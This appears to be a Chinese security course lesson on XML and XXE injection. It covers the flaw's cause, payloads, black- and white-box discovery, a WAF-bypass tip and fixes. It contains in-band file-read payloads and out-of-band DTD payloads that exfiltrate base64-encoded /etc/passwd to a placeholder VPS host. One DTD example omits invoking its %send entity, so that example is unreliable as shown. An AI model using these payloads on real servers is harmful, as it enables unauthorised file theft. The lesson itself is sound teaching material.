![](img/5efacfc93be64dbf29ec67aeac91fecd_1.png)

# 第59课：XML与XXE安全详解 🛡️

在本节课中，我们将要学习XML与XXE（XML外部实体注入）安全的相关知识。我们将从XML的基本概念入手，逐步深入到XXE漏洞的原理、利用方式（包括有回显和无回显攻击）、以及如何在黑盒与白盒测试中发现此类漏洞。课程内容力求简单直白，让初学者能够轻松理解。

![](img/5efacfc93be64dbf29ec67aeac91fecd_3.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_5.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_7.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_9.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_11.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_13.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_15.png)

---

![](img/5efacfc93be64dbf29ec67aeac91fecd_17.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_19.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_21.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_23.png)

## 概述 📋

![](img/5efacfc93be64dbf29ec67aeac91fecd_25.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_27.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_29.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_31.png)

XML（可扩展标记语言）是一种用于传输和存储数据的格式语言。XXE（XML External Entity）漏洞，也称为XML注入，发生在应用程序解析恶意构造的XML输入时。攻击者可以利用此漏洞读取服务器上的文件、进行内网探测，甚至在某些情况下执行命令。随着JSON格式的普及，XML的使用有所减少，但其安全问题依然重要。

![](img/5efacfc93be64dbf29ec67aeac91fecd_33.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_35.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_37.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_39.png)

---

![](img/5efacfc93be64dbf29ec67aeac91fecd_41.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_43.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_45.png)

## XML是什么？ 📄

![](img/5efacfc93be64dbf29ec67aeac91fecd_47.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_49.png)

XML是一种类似于JSON的数据传输和存储格式。它的设计初衷是为了以结构化的方式传输和存储数据。XML文档由标签和值组成，类似于键值对。

![](img/5efacfc93be64dbf29ec67aeac91fecd_51.png)

**示例XML结构：**
```xml
<user>
    <username>admin</username>
    <password>123456</password>
</user>
```

与JSON相比，XML的结构看起来更复杂，这也是其市场份额逐渐被JSON取代的原因之一。然而，许多遗留系统和特定场景仍在使用XML。

![](img/5efacfc93be64dbf29ec67aeac91fecd_53.png)

---

## XXE漏洞原理 ⚙️

![](img/5efacfc93be64dbf29ec67aeac91fecd_55.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_57.png)

XXE漏洞的产生源于应用程序在解析XML数据时，未对外部实体引用进行适当限制。当攻击者能够控制输入的XML数据，并插入恶意的外部实体声明时，就可能触发漏洞。

![](img/5efacfc93be64dbf29ec67aeac91fecd_59.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_61.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_63.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_65.png)

**漏洞核心流程：**
1.  应用程序接收XML格式的输入数据。
2.  使用XML解析器（如PHP的`simplexml_load_string`、Java的`DocumentBuilder`）处理该数据。
3.  如果XML数据中包含类似`<!ENTITY xxe SYSTEM "file:///etc/passwd">`的声明，解析器可能会尝试读取指定文件。
4.  若读取的内容被应用程序输出（回显），则攻击者可以直接看到文件内容。

![](img/5efacfc93be64dbf29ec67aeac91fecd_67.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_69.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_71.png)

上一节我们介绍了XML的基本概念，本节中我们来看看XXE漏洞是如何具体产生的。

![](img/5efacfc93be64dbf29ec67aeac91fecd_73.png)

---

![](img/5efacfc93be64dbf29ec67aeac91fecd_75.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_77.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_79.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_81.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_83.png)

## 有回显的XXE攻击 🎯

![](img/5efacfc93be64dbf29ec67aeac91fecd_85.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_87.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_89.png)

有回显攻击是最直接的利用方式。当服务器将XML解析后的部分内容返回给用户时，攻击者可以将文件读取的结果直接显示在响应中。

![](img/5efacfc93be64dbf29ec67aeac91fecd_91.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_93.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_95.png)

**攻击Payload示例：**
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///d:/1.txt">
]>
<user>
    <username>&xxe;</username>
    <password>123</password>
</user>
```

上述Payload定义了一个名为`xxe`的外部实体，其内容为`d:/1.txt`文件。在`<username>`标签中引用该实体`&xxe;`，当服务器解析XML时，就会用文件内容替换该实体引用。如果`<username>`的值被回显，攻击者就能看到文件内容。

![](img/5efacfc93be64dbf29ec67aeac91fecd_97.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_99.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_101.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_103.png)

**黑盒测试关注点：**
*   **HTTP请求头：** 观察`Content-Type`是否为`application/xml`或`text/xml`。
*   **请求体格式：** 请求体数据是否为XML结构。
*   满足以上任意一点，即可尝试注入XXE Payload进行测试。

![](img/5efacfc93be64dbf29ec67aeac91fecd_105.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_107.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_109.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_111.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_113.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_115.png)

---

![](img/5efacfc93be64dbf29ec67aeac91fecd_117.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_119.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_121.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_123.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_125.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_127.png)

## 无回显的XXE攻击与OOB盲注 🔍

![](img/5efacfc93be64dbf29ec67aeac91fecd_129.png)

在实际环境中，很多漏洞点并没有直接的回显。这时，我们需要使用“带外”（Out-Of-Band, OOB）技术来检测和利用漏洞，也称为XXE盲注。

![](img/5efacfc93be64dbf29ec67aeac91fecd_131.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_133.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_135.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_137.png)

### 1. 漏洞存在性探测

首先，我们需要确认漏洞是否存在。通过让服务器访问我们控制的远程资源，根据是否有访问记录来判断。

**探测Payload示例：**
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
    <!ENTITY % dtd SYSTEM "http://your-vps-ip/evil.dtd">
    %dtd;
]>
<user>
    <username>test</username>
    <password>test</password>
</user>
```

![](img/5efacfc93be64dbf29ec67aeac91fecd_139.png)

在远程服务器`your-vps-ip`上放置`evil.dtd`文件，内容为：
```dtd
<!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://your-vps-ip/?data=%payload;'>">
%int;
%trick;
```
同时，在服务器上开启HTTP服务（如`python -m http.server 80`）或使用DNSLOG等平台接收请求。如果收到来自目标服务器的请求，则证明存在XXE漏洞且可以发起外部请求。

![](img/5efacfc93be64dbf29ec67aeac91fecd_141.png)

### 2. 无回显数据外带

![](img/5efacfc93be64dbf29ec67aeac91fecd_143.png)

确认漏洞存在后，可以构造更复杂的Payload，将目标文件的内容通过HTTP请求发送到我们的服务器。

![](img/5efacfc93be64dbf29ec67aeac91fecd_145.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_147.png)

**利用Payload示例：**
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % dtd SYSTEM "http://your-vps-ip/evil.dtd">
    %dtd;
]>
<user>
    <username>test</username>
    <password>test</password>
</user>
```

![](img/5efacfc93be64dbf29ec67aeac91fecd_149.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_151.png)

远程服务器上的`evil.dtd`文件内容：
```dtd
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://your-vps-ip/?data=%file;'>">
%all;
```

![](img/5efacfc93be64dbf29ec67aeac91fecd_153.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_155.png)

这样，`/etc/passwd`文件经过Base64编码后，会作为URL参数`data`的值发送到我们的服务器，从而实现无回显的文件读取。

![](img/5efacfc93be64dbf29ec67aeac91fecd_157.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_159.png)

---

![](img/5efacfc93be64dbf29ec67aeac91fecd_161.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_163.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_165.png)

## 黑盒与白盒漏洞挖掘 🔎

![](img/5efacfc93be64dbf29ec67aeac91fecd_167.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_169.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_171.png)

### 黑盒测试
主要依赖于对HTTP请求的观察和分析。
以下是黑盒测试的关键步骤：
1.  **拦截请求：** 使用Burp Suite等工具拦截应用程序的请求。
2.  **识别XML：** 寻找`Content-Type: application/xml`或请求体为XML格式的数据包。
3.  **注入测试：** 尝试插入简单的XXE Payload（如有回显的文件读取），观察响应变化。
4.  **OOB探测：** 若无回显，则使用OOB Payload探测漏洞是否存在。

![](img/5efacfc93be64dbf29ec67aeac91fecd_173.png)

### 白盒审计
在拥有源代码的情况下，可以通过搜索关键函数来定位潜在的XXE漏洞点。

以下是不同语言中需要关注的XML解析函数：
*   **PHP：** `simplexml_load_string`, `DOMDocument::loadXML`, `xml_parse`
*   **Java：** `DocumentBuilder.parse`, `SAXParser.parse`, `XMLReader`
*   **Python：** `xml.etree.ElementTree.parse`, `lxml.etree.parse`

![](img/5efacfc93be64dbf29ec67aeac91fecd_175.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_177.png)

**审计思路：**
1.  在代码中全局搜索上述函数。
2.  回溯函数的输入参数，检查是否由用户可控（如`$_POST`, `$_GET`）。
3.  检查是否配置了禁止解析外部实体（如PHP的`libxml_disable_entity_loader`，Java的`setFeature(“http://apache.org/xml/features/disallow-doctype-decl”, true)`）。

![](img/5efacfc93be64dbf29ec67aeac91fecd_179.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_181.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_183.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_185.png)

上一节我们介绍了如何利用XXE漏洞，本节中我们来看看如何在不同的测试场景中发现它。

![](img/5efacfc93be64dbf29ec67aeac91fecd_187.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_189.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_191.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_192.png)

---

![](img/5efacfc93be64dbf29ec67aeac91fecd_194.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_195.png)

## 实战案例与技巧 🛠️

![](img/5efacfc93be64dbf29ec67aeac91fecd_197.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_199.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_200.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_202.png)

### 案例：某PHP CMS XXE漏洞审计
1.  **函数定位：** 在源码中搜索`simplexml_load_string`。
2.  **回溯调用链：** 找到使用该函数的代码块，发现其参数来自`$GLOBALS[‘HTTP_RAW_POST_DATA’]`（用户可控的原始POST数据）。
3.  **构造请求：** 直接访问调用该函数的脚本页面，发送恶意的XML数据。
4.  **利用：** 由于无回显，采用OOB盲注的方式成功读取服务器文件。

![](img/5efacfc93be64dbf29ec67aeac91fecd_204.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_206.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_208.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_210.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_211.png)

### 技巧与注意事项
*   **协议利用：** 除了`file://`协议，还可以尝试`http://`、`ftp://`、`php://filter`等协议进行文件读取或内网探测。
*   **空格处理：** 如果文件路径包含空格导致请求失败，可以尝试使用PHP过滤器进行Base64编码读取。
*   **WAF绕过：** 将恶意的DTD部分放在远程服务器上，本地XML只进行引用，有时可以绕过一些简单的过滤规则。

![](img/5efacfc93be64dbf29ec67aeac91fecd_213.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_215.png)

---

## 漏洞修复建议 🛡️

![](img/5efacfc93be64dbf29ec67aeac91fecd_217.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_219.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_220.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_222.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_224.png)

修复XXE漏洞的根本方法是禁用XML解析器对外部实体的解析能力。

![](img/5efacfc93be64dbf29ec67aeac91fecd_226.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_228.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_230.png)

以下是修复方案：
*   **PHP：** 使用`libxml_disable_entity_loader(true);`函数。
*   **Java：**
    ```java
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    dbf.setFeature(“http://apache.org/xml/features/disallow-doctype-decl”, true);
    dbf.setFeature(“http://xml.org/sax/features/external-general-entities”, false);
    dbf.setFeature(“http://xml.org/sax/features/external-parameter-entities”, false);
    ```
*   **Python (lxml)：** 使用`resolve_entities=False`参数。
*   **使用安全的替代方案：** 如果可能，将数据交换格式从XML迁移到JSON，并配合安全的解析器。

![](img/5efacfc93be64dbf29ec67aeac91fecd_232.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_234.png)

---

![](img/5efacfc93be64dbf29ec67aeac91fecd_236.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_238.png)

## 总结 📝

![](img/5efacfc93be64dbf29ec67aeac91fecd_239.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_241.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_242.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_243.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_245.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_247.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_249.png)

本节课中我们一起学习了XML与XXE安全。
我们从XML的基础概念讲起，明白了它是一种数据存储和传输格式。
随后，我们深入探讨了XXE漏洞的原理，即恶意XML外部实体被解析器执行。
我们详细分析了有回显和无回显（OOB盲注）两种攻击场景及其利用方法。
最后，我们介绍了如何在黑盒测试中通过观察请求特征来发现漏洞，以及在白盒审计中通过追踪XML解析函数来定位漏洞，并给出了相应的修复方案。
理解XXE漏洞的关键在于把握“用户输入控制XML解析”这一核心，希望本教程能帮助你建立起对XXE漏洞的全面认识。